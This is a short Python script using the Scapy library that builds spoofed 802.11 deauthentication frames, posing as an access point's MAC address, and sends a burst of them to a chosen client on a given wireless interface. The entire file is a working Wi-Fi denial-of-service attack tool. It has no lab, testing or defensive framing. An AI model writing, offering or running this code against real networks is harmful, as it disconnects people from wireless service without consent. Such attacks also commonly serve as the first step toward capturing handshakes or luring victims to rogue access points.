from scapy.all import *

def deauth_packets(target_mac, ap_mac, interface, count=100, interval=0.1):
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    print(f"[+] Sending {count} deauth packets from {ap_mac} to {target_mac} on {interface}")
    sendp(packet, iface=interface, count=count, inter=interval, verbose=1)
